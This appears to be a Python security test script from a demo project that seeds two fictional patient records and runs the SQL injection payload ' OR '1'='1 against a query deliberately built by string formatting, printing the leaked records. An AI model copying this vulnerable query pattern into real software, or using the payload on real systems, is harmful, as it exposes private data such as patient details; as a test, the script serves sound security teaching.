"""Security Test Case 1: SQL Injection (SQLi) Demonstration
Tests SQL Injection payload against the vulnerable search function.
"""
import sys
from pathlib import Path

# Add src to python path
SRC_DIR = Path(__file__).resolve().parent.parent / "src"
sys.path.insert(0, str(SRC_DIR))

from database import get_connection, initialize_database


def run_sqli_test():
    print("=" * 60)
    print("TEST CASE 1: SQL INJECTION EXPLOITATION")
    print("=" * 60)
    
    initialize_database()
    connection = get_connection()
    cursor = connection.cursor()

    # Insert test patient if empty
    cursor.execute("INSERT OR IGNORE INTO patients (patient_id, name, age, gender, phone, address) VALUES (1, 'John Doe', 30, 'Male', '9876543210', '123 Main St')")
    cursor.execute("INSERT OR IGNORE INTO patients (patient_id, name, age, gender, phone, address) VALUES (2, 'Jane Smith', 25, 'Female', '9123456789', '456 Oak St')")
    connection.commit()

    sqli_payload = "' OR '1'='1"
    print(f"[+] Injecting Payload: {sqli_payload}")

    vulnerable_query = f"SELECT patient_id, name, phone FROM patients WHERE name LIKE '%{sqli_payload}%'"
    print(f"[+] Constructed Vulnerable Query: {vulnerable_query}")

    cursor.execute(vulnerable_query)
    results = cursor.fetchall()

    print(f"[+] Records Leaked via SQL Injection: {len(results)}")
    for patient in results:
        print(f"    - Patient ID: {patient['patient_id']} | Name: {patient['name']} | Phone: {patient['phone']}")

    connection.close()
    assert len(results) > 0, "SQL Injection test failed: No records returned."
    print("\n[RESULT]: SQL Injection Vulnerability SUCCESSFULLY Exploited!\n")


if __name__ == "__main__":
    run_sqli_test()
